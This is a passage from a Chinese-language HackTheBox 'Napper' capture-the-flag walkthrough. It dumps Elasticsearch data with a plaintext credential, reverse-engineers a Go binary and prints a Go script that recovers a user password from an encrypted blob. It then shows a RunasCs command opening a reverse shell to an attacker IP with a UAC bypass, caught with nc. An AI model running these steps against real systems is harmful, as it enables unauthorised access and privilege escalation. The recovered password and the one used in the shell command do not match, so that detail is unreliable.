   也可以使用下列命令直接转储所有的index

   ```
   └─# curl -k -u elastic:oKHzjZw0EGcRxT2cux5K https://127.0.0.1:9200/_search?pretty=true
   {
     "took" : 2,
     "timed_out" : false,
     "_shards" : {
       "total" : 2,
       "successful" : 2,
       "skipped" : 0,
       "failed" : 0
     },
     "hits" : {
       "total" : {
         "value" : 2,
         "relation" : "eq"
       },
       "max_score" : 1.0,
       "hits" : [
         {
           "_index" : "seed",
           "_id" : "1",
           "_score" : 1.0,
           "_source" : {
             "seed" : 23230203
           }
         },
         {
           "_index" : "user-00001",
           "_id" : "ygbD1YsBA19Pbpou_XTZ",
           "_score" : 1.0,
           "_source" : {
             "blob" : "fyRMie4dee8s7McKsgTrPokjef51WjVx7DKnAWHnyU1w6PyeKcGwn4Nhzv5Dda6m6rOJCGEg8sI=",
             "timestamp" : "2023-11-15T17:34:33.4026408-08:00"
           }
         }
       ]
     }
   }
   ```

   注意到两次user-00001中的blob不一样。该服务枚举结束，暂时没有找到有用的内容。



## 3.2 web站点目录枚举

1. 检索password字符串，没有找到

   ```
   findstr /S /C:"password" "C:\Temp\www\*"
   ```

2. 在`C:\Temp\www\internal\content\posts\internal-laps-alpha`下发现一个可执行程序a.exe，将其移到到本地ida中分析

   从main函数开始，可以看到调用了一个叫做`github_com_joho_godotenv_Load`的函数，google搜索得知这是golang的加载示例

   ![image-20231116101802840](https://raw.githubusercontent.com/yxl2001/Note-drawing-bed/main/images/202311161145977.png)





## 3.3 a.exe粗略分析

1. 不是很熟悉golang的反汇编，通过查看大概调用的函数来理解这个可执行文件的功能。

   调用了`github_com_elastic_go_elasticsearch_v8_NewClient`，这是go使用 NewDefaultClient 函数创建elasticsearch的客户端

   ![image-20231116102836535](https://raw.githubusercontent.com/yxl2001/Note-drawing-bed/main/images/202311161145031.png)



2. 调用了main_genKey（），从函数名来看大概是获取什么key

   ![image-20231116103039565](https://raw.githubusercontent.com/yxl2001/Note-drawing-bed/main/images/202311161145556.png)

   双击main_genkey（）查看它的伪代码，`math_rand___Rand__Seed`，google得知这似乎是调用了什么种子

   ![image-20231116103129423](https://raw.githubusercontent.com/yxl2001/Note-drawing-bed/main/images/202311161146342.png)

   我们之前在elasticsearch中转储seed index的时候获取了一个种子，加上之前的创建elasticsearch客户端，这里面应该有联系。



3. 然后是`main_encrypt()`，顾名思义应该是一个加密函数

   ![image-20231116104117607](https://raw.githubusercontent.com/yxl2001/Note-drawing-bed/main/images/202311161146821.png)



## 3.4 破解用户密码

1. 逆向a.exe只了解了一个大概，对于如何解密没有头绪，网上看了一些[其他大佬](https://ipiratexaptain.gitbook.io/ipiratexaptain/hackthebox/napper)的分析

   > ​		下载前面的a.exe并反编译它，程序是用golang编写的，从main.main函数中，我看到程序调用获取elasticsearch中的“种子”进行随机化和编码，然后调用user-00001。一般来说，user-00001中的blob是加密后的用户名和密码，但它是不断变化的。一般来说，user-00001中的blob是加密后的用户名和密码，但它是不断变化的。



2. 破解脚本来自于上述文章

   ```
   package main
   
   import (
       "crypto/aes"
       "crypto/cipher"
       "math/rand"
       "encoding/base64"
       "fmt"
   )
   
   func main() {
   
       // the Blob
       blobEncrypted := "2p3RM44q6HTjKvSHqXeHXrdbezyQvj-GOuklwo89GK4GI81may2JC6AhxnuBXGGdyT8SO5dSNYQ="
   
       // seed the RNG
       rng := rand.New(rand.NewSource(64865350))
   
       // generate the "random" key
       key := make([]byte, 16)
   
       for i := 0; i < 16; i++ {
           k :=  rng.Intn(254) + 1
           key[i] = byte(k)
   
           fmt.Printf("Random Bytes: %x\n", k)
       }
   
       // decrypt
       text := decrypt(key, blobEncrypted)
       fmt.Printf(text)
   }
   
   // decrypt from base64 to decrypted string
   func decrypt(key []byte, cryptoText string) string {
       ciphertext, _ := base64.URLEncoding.DecodeString(cryptoText)
   
       block, err := aes.NewCipher(key)
       if err != nil {
           panic(err)
       }
   
       // The IV needs to be unique, but not secure. Therefore it's common to
       // include it at the beginning of the ciphertext.
       if len(ciphertext) < aes.BlockSize {
           panic("ciphertext too short")
       }
       iv := ciphertext[:aes.BlockSize]
       ciphertext = ciphertext[aes.BlockSize:]
   
       stream := cipher.NewCFBDecrypter(block, iv)
   
       // XORKeyStream can work in-place if the two arguments are the same.
       stream.XORKeyStream(ciphertext, ciphertext)
   
       return fmt.Sprintf("%s", ciphertext)
   }
   ```

   执行下列命令获取seed，这里是64865350

   ```
   └─# curl -k -u elastic:oKHzjZw0EGcRxT2cux5K https://127.0.0.1:9200/seed/_search?pretty=true      
   {
     "took" : 5,
     "timed_out" : false,
     "_shards" : {
       "total" : 1,
       "successful" : 1,
       "skipped" : 0,
       "failed" : 0
     },
     "hits" : {
       "total" : {
         "value" : 1,
         "relation" : "eq"
       },
       "max_score" : 1.0,
       "hits" : [
         {
           "_index" : "seed",
           "_id" : "1",
           "_score" : 1.0,
           "_source" : {
             "seed" : 64865350
           }
         }
       ]
     }
   }
   ```

   执行下列命令获取blob，这里是`2p3RM44q6HTjKvSHqXeHXrdbezyQvj-GOuklwo89GK4GI81may2JC6AhxnuBXGGdyT8SO5dSNYQ=`

   ```
   └─# curl -k -u elastic:oKHzjZw0EGcRxT2cux5K https://127.0.0.1:9200/user-00001/_search?pretty=true
   {
     "took" : 3,
     "timed_out" : false,
     "_shards" : {
       "total" : 1,
       "successful" : 1,
       "skipped" : 0,
       "failed" : 0
     },
     "hits" : {
       "total" : {
         "value" : 1,
         "relation" : "eq"
       },
       "max_score" : 1.0,
       "hits" : [
         {
           "_index" : "user-00001",
           "_id" : "2QYE1osBA19PbpouFHRv",
           "_score" : 1.0,
           "_source" : {
             "blob" : "2p3RM44q6HTjKvSHqXeHXrdbezyQvj-GOuklwo89GK4GI81may2JC6AhxnuBXGGdyT8SO5dSNYQ=",
             "timestamp" : "2023-11-15T18:44:33.4988311-08:00"
           }
         }
       ]
     }
   }
   ```

   更新脚本中的seed和blob，然后运行该脚本破解密码

   ```
   └─# go run exploit.go                                                                  
   Random Bytes: fb
   Random Bytes: 1c
   Random Bytes: ef
   Random Bytes: 23
   Random Bytes: d6
   Random Bytes: fa
   Random Bytes: 6
   Random Bytes: 21
   Random Bytes: 76
   Random Bytes: 93
   Random Bytes: 4f
   Random Bytes: aa
   Random Bytes: 42
   Random Bytes: 8e
   Random Bytes: 9
   Random Bytes: 29
   zDKWrXntLTHkXgzkBrdQgcdcZdjXiMDkmmWnsASd 
   ```



3. 切换到backup用户

   使用[Runascs.exe](https://github.com/antonioCoco/RunasCs)

   ```
   C:\Users\ruben\Documents>RunasCs.exe backup xDZqUCsRrJzgHEjDaWVwiiVXeujqrMFGGVjTxdZJ cmd.exe -r 10.10.16.3:4444 --bypass-uac
   RunasCs.exe backup xDZqUCsRrJzgHEjDaWVwiiVXeujqrMFGGVjTxdZJ cmd.exe -r 10.10.16.3:4444 --bypass-uac
   [+] Running in session 0 with process function CreateProcessWithLogonW()
   [+] Using Station\Desktop: Service-0x0-3617a$\Default
   [+] Async process 'cmd.exe' with pid 3164 created and left in background.
   ```

   成功获取backup的shell

   ```
   └─# nc -nvlp 4444
   listening on [any] 4444 ...
   connect to [10.10.16.3] from (UNKNOWN) [10.10.11.240] 61388
   Microsoft Windows [Version 10.0.19045.3636]
   (c) Microsoft Corporation. All rights reserved.
   
   C:\Windows\system32>whoami
   whoami
   napper\backup
   ```

   
